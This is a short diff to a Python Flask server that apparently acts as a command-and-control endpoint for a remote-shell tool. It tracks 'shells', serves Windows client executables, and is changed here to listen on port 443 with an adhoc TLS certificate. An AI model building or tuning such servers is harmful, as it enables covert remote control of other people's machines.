@@ -14,15 +14,12 @@ current_user = ''
 current_dir = ''
 
 DEFAULT_IP_BIND_ADDRESS = '0.0.0.0'
-DEFAULT_PORT = 8443
+DEFAULT_PORT = 443
 DEFAULT_SSL_FLAG = True
 
 shells_filename = 'shells.txt'
 client_win32_executable_file = './dist/client86.exe'
 client_win64_executable_file = './dist/client64.exe'
-
-tls_certificate_path = ''
-tls_private_key_path = ''
 
 
 @app.route('/client86.exe')
@@ -135,14 +132,9 @@ class FlaskThread():
 
     def run(self):
         if self.ssl:
-            if tls_certificate_path and tls_private_key_path:
-                self.app.run(host=self.ip,
-                             port=self.port,
-                             ssl_context=(tls_certificate_path, tls_private_key_path))
-            else:
-                self.app.run(host=self.ip,
-                             port=self.port,
-                             ssl_context='adhoc')
+            self.app.run(host=self.ip,
+                         port=self.port,
+                         ssl_context='adhoc')
         else:
             self.app.run(host=self.ip,
                          port=self.port)
